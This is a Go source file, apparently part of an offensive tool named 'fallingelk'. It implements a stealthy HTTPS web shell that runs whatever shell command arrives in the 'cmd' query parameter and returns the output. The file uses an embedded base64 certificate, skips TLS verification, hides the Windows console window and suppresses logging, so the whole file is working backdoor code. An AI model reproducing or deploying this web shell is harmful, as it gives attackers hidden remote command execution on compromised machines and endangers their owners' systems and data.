// +build windows

package main

import (
	"crypto/tls"
	b64 "encoding/base64"
	"fmt"
	"net/http"
	"os"
	"os/exec"
	"runtime"

	"github.com/schwartz1375/fallingelk/shell"
)

const nixShellPath = "/bin/sh"
const winShellPath = "C:\\Windows\\System32\\cmd.exe"

var (
	key  string
	cert string
)

func main() {
	//log.Println("Starting up...")
	keyFile, err := b64.StdEncoding.DecodeString(key)
	if err != nil {
		//log.Fatalf("Decode key failed:%v", err)
		os.Exit(1)
	}
	certFile, err := b64.StdEncoding.DecodeString(cert)
	if err != nil {
		//log.Fatalf("Decode cert failed:%v", err)
		os.Exit(1)
	}

	// Construct a tls.config
	cert, err := tls.X509KeyPair([]byte(certFile), []byte(keyFile))
	tlsConfig := &tls.Config{
		Certificates:       []tls.Certificate{cert},
		InsecureSkipVerify: true, //TLS is susceptible to machine-in-the-middle attacks unless custom verification is used
		//https://http2.github.io/http2-spec/#rfc.section.9.2.2
		MinVersion:               tls.VersionTLS12,
		CurvePreferences:         []tls.CurveID{tls.CurveP521, tls.CurveP384, tls.CurveP256},
		PreferServerCipherSuites: true,
		CipherSuites: []uint16{
			tls.TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256, //need for HTTP2 https://blog.bracebin.com/achieving-perfect-ssl-labs-score-with-go
		},
	}
	webSrv := &http.Server{
		Addr:      ":443",
		TLSConfig: tlsConfig,
	}

	http.HandleFunc("/", requestHandler)
	err = webSrv.ListenAndServeTLS("", "")
	if err != nil {
		//log.Fatal("Error creating server! ", err)
		os.Exit(1)
	}
}

func requestHandler(writer http.ResponseWriter, request *http.Request) {
	//Get command to execute from GET query param
	cmd := request.URL.Query().Get("cmd")
	if cmd == "" {
		//fmt.Println(writer, "No command provided, tryp /?cmd=whoami")
		return
	}

	//log.Printf("Request from %s: %s\n", request.RemoteAddr, cmd)
	fmt.Fprintf(writer, "You requested command: %s\n", cmd)

	var command *exec.Cmd
	if runtime.GOOS == "windows" {
		command = exec.Command(winShellPath, "/c", cmd+"\n")
		shell.SetHide(command)
		//log.Printf("Shell ended for %s", conn.RemoteAddr())
	} else {
		command = exec.Command(nixShellPath, "-c", cmd+"\n") //shellPath
		//log.Printf("Shell ended for %s", conn.RemoteAddr())
	}

	output, err := command.Output()
	if err != nil {
		fmt.Fprintf(writer, "error with command.\n%s\n", err.Error())
	}

	//write output of command to the response writer interface
	fmt.Fprintf(writer, "Output: \n%s\n", output)
}
